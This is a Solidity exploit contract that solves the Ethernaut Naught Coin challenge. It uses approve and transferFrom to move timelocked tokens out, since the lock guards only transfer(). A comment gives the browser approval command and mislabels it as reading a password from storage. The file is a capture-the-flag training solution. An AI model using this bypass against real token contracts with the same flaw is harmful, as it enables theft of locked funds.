// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/INaughtCoin.sol";

/**
 * @title Naught Coin Attack (Ethernaut Challenge Level 15 - Naught Coin)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 15
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218
 */
contract NaughtCoinAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @dev To get password from storage, you can run this script in browser:
     * > await contract.approve(<NaughtCoinAttack_CONTRACT_ADDRESS>, await contract.balanceOf(player))
     * @param target Address of target contract
     */
    function attack(INaughtCoin target) external {
        require(
            target.transferFrom(msg.sender, address(this), target.balanceOf(msg.sender)) &&
                0 == target.balanceOf(msg.sender),
            "NaughtCoin: Attack failed"
        );
    }
}
